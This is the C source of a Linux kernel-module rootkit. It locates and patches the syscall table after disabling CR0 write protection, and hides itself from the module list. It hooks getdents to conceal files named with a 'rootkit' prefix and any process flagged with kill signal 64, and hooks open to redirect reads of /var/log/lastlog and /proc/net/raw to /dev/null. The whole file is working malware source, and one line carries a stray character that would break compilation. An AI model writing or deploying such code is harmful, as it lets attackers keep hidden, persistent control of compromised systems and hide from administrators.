#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

// all files with this prefix will be hidden
#define PREFIX "rootkit"

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

// pointer to the sys_call_table
static unsigned long *sys_call_table;
// the PID that we need to hide when 'kill -64' is executed
char hide_pid[NAME_MAX];

// original functions that we need to save for later use
asmlinkage int (*orig_getdents)(unsigned int, struct linux_dirent*, unsigned int);
asmlinkage int (*orig_kill)(pid_t, int);
asmlinkage int (*orig_open)(const char*, int);

inline void cr0_write(unsigned long cr0) {
    // change the value of cr0
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

static inline void protect_memory(void) {
    // get the current value of cr0
    unsigned long cr0 = read_cr0();
    // set the 16th bit
    set_bit(16, &cr0);
    // write the new value to the cr0 register
    cr0_write(cr0);
}

static inline void unprotect_memory(void) {
    // get the current value of cr0
    unsigned long cr0 = read_cr0();
    // unset the 16th bit
    clear_bit(16, &cr0);
    // write the new value to the cr0 register
    cr0_write(cr0);
}

// hide the module from 'lsmod'
static inline void hide_module(void) {
    list_del(&THIS_MODULE->list);
}

// a hook for the getdents function
int hook_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    long error;
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    // save the original getdents function for later use
    int ret = orig_getdents(fd, dirp, count);
    // allocate memory of size ret and set it to zero;
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    // if getdents returns zero or kzalloc fails, return getdents's result
    if (ret <= 0 || dirent_ker == NULL)
        return ret;

    // copy ret bytes from user space (dirp) to kernel space (dirent_ker)
    error = copy_from_user(dirent_ker, dirp, ret);

    // if copy_from_user fails, goto done
    if (error)
        goto done;


    while (offset < ret) {
        // get next file/directory
        current_dir = (void*) dirent_ker + offset;

        // if PREFIX matches the current file/directory or if current directory matches the PID of the process saved in hide_pid, continue inside if
        if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 ||
            (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0 && strncmp(hide_pid, "", NAME_MAX) != 0)) {
            // if our match is the first struct in the list, shift everything else up by its size
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void*) current_dir + current_dir->d_reclen, ret);
                continue;
            }

            // add the length of the current directory to that of the previous directory
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            // save current_dir into previous_dir
            previous_dir = current_dir;
        }

        // increment the offset by the length of the current directory, i.e. get next file/directory
        offset += current_dir->d_reclen;
    }

    // copy ret bytes from kernel space (dirent_ker) to user space (dirp)
    error = copy_to_user(dirp, dirent_ker, ret);

    // if copy_to_user fails, goto done
    if (error)
        goto done;

done:
    // free previously allocated memory
    kfree(dirent_ker);

    // return the result of the original getdents function
    return ret;
}

// a hook for the kill function
int hook_kill(pid_t pid, int sig) {
    // if the kill signal is 64, save the PID into hide_pid
    // hide_pid is then used in the above getdents function in order to hide the process
    if (sig == 64) {
        printk("rootkit: Hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }

    // if the kill signal is different than 64, return the result of the original kill function
    return orig_kill(pid, sig);
}

// a hook for the open function
int hook_open(const char *pathname, int flags) {
    // if the pathname is equal to /var/log/lastlog or /proc/net/raw, read file /dev/null instead
    if (memcmp(pathname, "/var/log/lastlog", 17) == 0 || memcmp(pathname, "/proc/net/raw", 14) == 0) {
        // allocate memory of size 10 and set it to 0
        char *newPathname = kzalloc(10, GFP_KERNEL);
        mm_segment_t old_fs;
        int ret;

        // if kzalloc fails, return the result of the original open function
        if (newPathname == NULL)z
            return orig_open(pathname, flags);

        // copy the string "/dev/null" into newPathname
        strcpy(newPathname, "/dev/null");
        printk("rootkit: Reading file /dev/null instead of %s!\n", pathname);

        // get the current filesystem
        old_fs = get_fs();
        // set the filesystem to kernel data segment
        set_fs(KERNEL_DS);
        // get the result of the original open function
        ret = orig_open(newPathname, flags);
        // restore back the old filesystem
        set_fs(old_fs);

        return ret;
    }

    return orig_open(pathname, flags);
}

// called when insmod is executed
static int __init module_load(void) {
    printk("rootkit: HELLO :)\n");

    // find and save the address of the sys_call_table
    sys_call_table = (void*) kallsyms_lookup_name("sys_call_table");

    // if the sys_call_table can not be found, exit
    if (!sys_call_table) {
        printk("rootkit: Could not find the sys_call_table!\n");
        return -1;
    }

    // original functions that we need to save for later use
    orig_getdents = (void*) sys_call_table[__NR_getdents];
    orig_kill = (void*) sys_call_table[__NR_kill];
    orig_open = (void*) sys_call_table[__NR_open];

    printk("rootkit: Found the syscall table at 0x%lx\n", *sys_call_table);

    unprotect_memory();
    // hide this module
    hide_module();

    // hook fake getdents
    sys_call_table[__NR_getdents] = (unsigned long) hook_getdents;
    // hook fake kill
    sys_call_table[__NR_kill] = (unsigned long) hook_kill;
    // hook fake open
    sys_call_table[__NR_open] = (unsigned long) hook_open;
    protect_memory();

    return 0;
}

// called when rmmod is executed
static void __exit module_unload(void) {
    unprotect_memory();
    // hook original getdents
    sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
    // hook original kill
    sys_call_table[__NR_kill] = (unsigned long) orig_kill;
    // hook original open
    sys_call_table[__NR_open] = (unsigned long) orig_open;
    protect_memory();

    printk("rootkit: GOODBYE :(\n");
}

module_init(module_load);
module_exit(module_unload);
